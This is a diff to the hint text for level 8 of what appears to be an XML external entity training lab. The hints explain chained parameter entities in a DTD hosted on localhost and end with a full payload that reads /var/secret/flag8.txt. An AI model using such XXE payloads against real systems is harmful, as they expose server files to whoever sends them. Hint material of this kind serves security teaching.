@@ -100,7 +100,7 @@ function get_level_hints(int $levelId): array {
         8 => [
             'This level is about <em>parameter</em> entities (<code>%name;</code>) and chaining several of them so one builds the next.',
             'You cannot chain nested entity definitions in the internal subset, so the lab hosts the chain in an external DTD at <code>http://127.0.0.1/chain.dtd</code>.',
-            'That DTD defines <code>%f1</code> = the file, <code>%f2</code> = <code>%f1;</code>, and <code>%build</code> = a declaration for a general entity <code>&amp;chained;</code> whose value is <code>%f2;</code>. Each entity depends on the previous one.',
+            'That DTD defines <code>%f1</code> = the file content, and <code>%f2</code> = a declaration for a general entity <code>&amp;chained;</code> whose value is <code>%f1;</code>. Referencing <code>%f2;</code> executes that declaration, so each entity depends on the previous one.',
             'You pull the chain in with a parameter entity, then reference <code>&amp;chained;</code> in the body to reflect <code>/var/secret/flag8.txt</code> into the output.',
             'Full payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [<br>&nbsp; &lt;!ENTITY % remote SYSTEM "http://127.0.0.1/chain.dtd"&gt;<br>&nbsp; %remote;<br>]&gt;<br>&lt;root&gt;&amp;chained;&lt;/root&gt;</code>',
         ],
